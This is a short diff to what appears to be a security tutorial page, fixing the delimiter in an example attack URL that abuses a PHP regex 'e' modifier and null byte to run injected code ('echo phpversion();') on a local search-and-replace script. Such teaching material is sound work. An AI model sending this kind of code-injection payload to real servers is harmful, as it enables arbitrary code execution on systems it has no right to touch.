@@ -229,7 +229,7 @@ Arbitrary code execution
 #### Attack
 
 ```
-http://localhost/naive-search-replace.php?pattern=.%2fe%00&replace=echo%20phpversion();
+http://localhost/naive-search-replace.php?pattern=.%23e%00&replace=echo%20phpversion();
 ```
 
 #### Result
